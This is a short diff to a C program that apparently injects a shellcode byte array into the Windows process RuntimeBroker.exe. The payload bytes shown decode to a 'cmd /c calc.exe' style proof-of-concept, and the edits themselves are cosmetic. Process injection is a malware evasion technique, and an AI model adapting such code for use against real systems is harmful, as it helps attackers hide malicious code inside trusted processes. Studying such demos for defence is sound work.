@@ -1,9 +1,9 @@
 #include "Threading.h"
+#include "box.h"
 
 #define TARGET		"RuntimeBroker.exe"
 
-
-int main(int argc, char* argv[])
+int main()
 {
 
 	UCHAR Shellcode[] = {
@@ -33,8 +33,6 @@ int main(int argc, char* argv[])
 	0x64,0x2e,0x65,0x78,0x65,0x20,0x2f,0x63,0x20,0x63,0x61,0x6c,
 	0x63,0x2e,0x65,0x78,0x65,0x00
 	};
-
-
 
 	HANDLE hProcess = NULL;
 	HANDLE hThread = NULL;
@@ -92,5 +90,6 @@ int main(int argc, char* argv[])
 	getchar();
 
 	return 0;
+
 
 }
